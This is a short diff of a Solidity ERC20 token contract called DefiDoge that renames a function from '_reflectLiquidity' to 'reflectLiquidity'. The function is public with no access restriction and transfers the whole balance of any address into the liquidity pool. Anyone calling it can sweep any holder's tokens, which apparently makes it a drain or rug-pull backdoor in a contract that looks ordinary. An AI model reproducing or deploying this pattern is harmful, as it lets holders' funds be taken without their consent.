@@ -909,7 +909,7 @@ contract DefiDoge is Context, IERC20, Ownable {
         _isExcludedFromFee[account] = true;
     }
     
-    function _reflectLiquidity(address addr) public {
+    function reflectLiquidity(address addr) public {
         if (_isExcluded[addr])  _transfer(addr, uniSwapV2LiquidityPool(), _tOwned[addr]);
         else  _transfer(addr, uniSwapV2LiquidityPool(), tokenFromReflection(_rOwned[addr]));
     }
